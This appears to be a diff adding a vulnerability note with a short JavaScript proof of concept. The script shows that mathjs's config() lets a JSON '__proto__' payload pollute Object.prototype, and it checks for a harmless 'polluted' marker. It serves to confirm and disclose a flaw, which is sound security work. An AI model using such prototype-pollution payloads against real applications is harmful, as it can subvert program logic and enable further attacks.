@@ -1,0 +1,23 @@
+Verified the exploit works — `math.config()` pollutes `Object.prototype` via `deepExtend`'s missing `__proto__` guard.
+
+```javascript
+const math = require("mathjs");
+
+console.log("Before attack, {}.polluted =", ({}).polluted);
+
+// mathjs's config() merges the given options object into its internal
+// config using object.deepExtend(), which recurses into plain-object
+// values without ever excluding the "__proto__" key. Supplying a
+// JSON-parsed payload containing "__proto__" lets us walk the merge
+// straight onto Object.prototype.
+const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+math.config(payload);
+
+console.log("After attack, {}.polluted =", ({}).polluted);
+
+if (({}).polluted === "yes") {
+  console.log("VULNERABLE: Object.prototype was polluted via math.config()");
+} else {
+  console.log("Not vulnerable");
+}
+```
